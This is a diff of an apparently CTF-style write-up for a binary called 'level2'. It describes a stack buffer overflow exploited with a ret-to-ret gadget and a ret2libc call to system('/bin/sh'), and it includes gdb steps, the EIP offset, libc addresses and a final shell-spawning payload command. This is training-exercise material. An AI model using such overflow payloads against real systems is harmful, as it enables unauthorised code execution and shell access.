@@ -1,44 +1,35 @@
-after inspection of the binary
-
-
-it use gets to read from stdin, puts what it store and call strdup at the end
-
-see in gdb or source
+It wait for an input, print it and call strdup right after.
 
 
 First we try to see if we control eip
-
 gdb ./level2
 
-run < <(python -c 'print "A" * 100')
+run < <(python -c 'print "A" * 80')
 
-0x41414141 in ?? => which is our A, great it mean we can control EIP, after some try i found out that the offset is 80, the next 4 bytes writen after 80 will overwrite EIP
+0x41414141 in ?? => we control EIP, offset is 80 because our buffer is 76 + EBP
++ EIP
 
-b* on ret (p)
-run < <(python -c 'print "A" * 80)
-info registers
-esp = bffff6f0
+We cannot use stack address for EIP since they start with 0xbf and it is check in
+the program.
+0x08048500 <+44>:	cmp    $0xb0000000,%eax
 
-let's try to redirect EIP on the stack on then print CC instruction which is `trap to debugger` to see if we control eip well
 
-try it with our prog now : 
-./level2 < <(python -c 'print "A" * 80 + "\xf0\xf6\xff\xbf" + "\xCC\xCC\xCC\xCC"')
+We can use a little trick.
 
-(0xbffff6f0)
-
-surprise we cannot use stack address since it start with 0xb and the prog has a condition to check that
-
-we can try something else
-what if we return ret to himself so the address does not start with 0xb and then jump to system ?
-
-it work
+Make ret jump to himself so it doesn't trigger the cmp, and it will pop himself
+ou the of the stack and execute the next instruction, which could be from the
+stack now.
 
 0x0804853e = himself (ret)
-0xb7e6b060 = system ( p system)
-AAAA = ret addr ( could be whatever )
-0xb7f8cc58 = "/bin/sh" ( how ?? )
+0xb7e6b060 = system (p system)
+AAAA = ret addr for system ( could be whatever )
 
-normally the caller p() push the argument "/bin/sh" to the stack first and then execute system but this time the callee (system) expects its arguments to be right after the ret addr where system will return after it finishes
+We also need to find an string "/bin/sh" to put on the top of the stack for
+system.
 
-payload ->
+(gdb) info proc mapping
+(gdb) find 0xb7e2c000, +999999, "/bin/sh"
+
+
+Final payload : 
 cat <(python -c 'print "A" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7"') - | ./level2
